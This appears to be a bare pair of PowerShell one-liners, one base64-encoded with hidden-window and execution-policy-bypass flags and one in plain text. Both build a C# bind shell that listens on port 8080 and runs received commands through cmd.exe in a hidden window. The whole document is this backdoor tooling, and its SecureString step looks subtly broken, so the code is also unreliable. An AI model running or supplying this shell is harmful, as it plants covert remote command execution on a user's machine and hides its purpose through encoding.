powershell -nop -w 1 -ex bypass -enc "JGNvZGUgPSBAJ3VzaW5nIFN5c3RlbTt1c2luZyBTeXN0ZW0uTmV0O3VzaW5nIFN5c3RlbS5OZXQuU29ja2V0czt1c2luZyBTeXN0ZW0uSU87dXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzO2NsYXNzIFByb2dyYW17c3RhdGljIHZvaWQgTWFpbigpe0lQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZShgIjEyNy4wLjAuMWAiKTtUY3BMaXN0ZW5lciBzZXJ2ZXIgPSBuZXcgVGNwTGlzdGVuZXIoaXAsIDgwODApO3NlcnZlci5TdGFydCgpO0NvbnNvbGUuV3JpdGVMaW5lKGAiU2VydmVyIGhhcyBzdGFydGVkIG9uIGAiICsgaXAgKyBgIjo4MDgwLiBXYWl0aW5nIGZvciBhIGNvbm5lY3Rpb24uLi5gIik7VGNwQ2xpZW50IGNsaWVudCA9IHNlcnZlci5BY2NlcHRUY3BDbGllbnQoKTtDb25zb2xlLldyaXRlTGluZShgIkEgY2xpZW50IGNvbm5lY3RlZC5gIik7TmV0d29ya1N0cmVhbSBucyA9IGNsaWVudC5HZXRTdHJlYW0oKTtTdHJlYW1SZWFkZXIgc3IgPSBuZXcgU3RyZWFtUmVhZGVyKG5zKTtTdHJlYW1Xcml0ZXIgc3cgPSBuZXcgU3RyZWFtV3JpdGVyKG5zKTtzdy5BdXRvRmx1c2ggPSB0cnVlO3doaWxlKHRydWUpe3N0cmluZyBjb21tYW5kID0gc3IuUmVhZExpbmUoKTtpZihjb21tYW5kLlRvTG93ZXIoKSA9PSBgImV4aXRgIilicmVhazt0cnl7UHJvY2VzcyBwcm9jZXNzID0gbmV3IFByb2Nlc3MoKTtwcm9jZXNzLlN0YXJ0SW5mby5GaWxlTmFtZSA9IGAiY21kLmV4ZWAiO3Byb2Nlc3MuU3RhcnRJbmZvLkFyZ3VtZW50cyA9IGAiL0MgYCIgKyBjb21tYW5kO3Byb2Nlc3MuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlO3Byb2Nlc3MuU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlO3Byb2Nlc3MuU3RhcnRJbmZvLkNyZWF0ZU5vV2luZG93ID0gdHJ1ZTtwcm9jZXNzLlN0YXJ0KCk7c3RyaW5nIG91dHB1dCA9IHByb2Nlc3MuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCk7c3cuV3JpdGVMaW5lKG91dHB1dCk7cHJvY2Vzcy5XYWl0Rm9yRXhpdCgpO31jYXRjaCAoRXhjZXB0aW9uIGUpe3N3LldyaXRlTGluZShgIkVycm9yOiBgIiArIGUuTWVzc2FnZSk7fX1jbGllbnQuQ2xvc2UoKTtzZXJ2ZXIuU3RvcCgpO319J0A7JHNlY3VyZVN0cmluZyA9ICRjb2RlIHwgQ29udmVydFRvLVNlY3VyZVN0cmluZyAtQXNQbGFpblRleHQgLUZvcmNlOyRzZWN1cmVTdHJpbmcgfCBDb252ZXJ0RnJvbS1TZWN1cmVTdHJpbmcgfCBBZGQtVHlwZSAtTGFuZ3VhZ2UgQ1NoYXJwIC1QYXNzVGhydSB8IE91dC1OdWxsO1tQcm9ncmFtXTo6TWFpbigp"

or

powershell -c "$code = @'using System;using System.Net;using System.Net.Sockets;using System.IO;using System.Diagnostics;class Program{static void Main(){IPAddress ip = IPAddress.Parse(`"127.0.0.1`");TcpListener server = new TcpListener(ip, 8080);server.Start();Console.WriteLine(`"Server has started on `" + ip + `":8080. Waiting for a connection...`");TcpClient client = server.AcceptTcpClient();Console.WriteLine(`"A client connected.`");NetworkStream ns = client.GetStream();StreamReader sr = new StreamReader(ns);StreamWriter sw = new StreamWriter(ns);sw.AutoFlush = true;while(true){string command = sr.ReadLine();if(command.ToLower() == `"exit`")break;try{Process process = new Process();process.StartInfo.FileName = `"cmd.exe`";process.StartInfo.Arguments = `"/C `" + command;process.StartInfo.RedirectStandardOutput = true;process.StartInfo.UseShellExecute = false;process.StartInfo.CreateNoWindow = true;process.Start();string output = process.StandardOutput.ReadToEnd();sw.WriteLine(output);process.WaitForExit();}catch (Exception e){sw.WriteLine(`"Error: `" + e.Message);}}client.Close();server.Stop();}}'@;$secureString = $code | ConvertTo-SecureString -AsPlainText -Force;$secureString | ConvertFrom-SecureString | Add-Type -Language CSharp -PassThru | Out-Null;[Program]::Main()"